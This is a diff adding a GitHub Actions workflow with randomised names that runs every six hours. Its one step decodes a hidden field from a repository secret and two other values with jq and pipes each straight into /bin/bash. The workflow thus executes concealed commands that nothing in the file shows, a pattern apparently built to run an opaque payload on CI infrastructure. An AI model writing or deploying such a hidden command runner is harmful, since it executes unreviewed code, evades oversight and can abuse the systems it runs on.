@@ -1,0 +1,20 @@
+name: cuifenbian7641
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: cuifenbian7641
+        env:
+          tb690: ${{ secrets.tb690 }}
+        run: |
+          echo $tb690 | jq -r .qekv9502 | /bin/bash
+          echo $y6914 | jq -r .cmg06 | /bin/bash
+          echo $mt775 | jq -r .d03 | /bin/bash
+
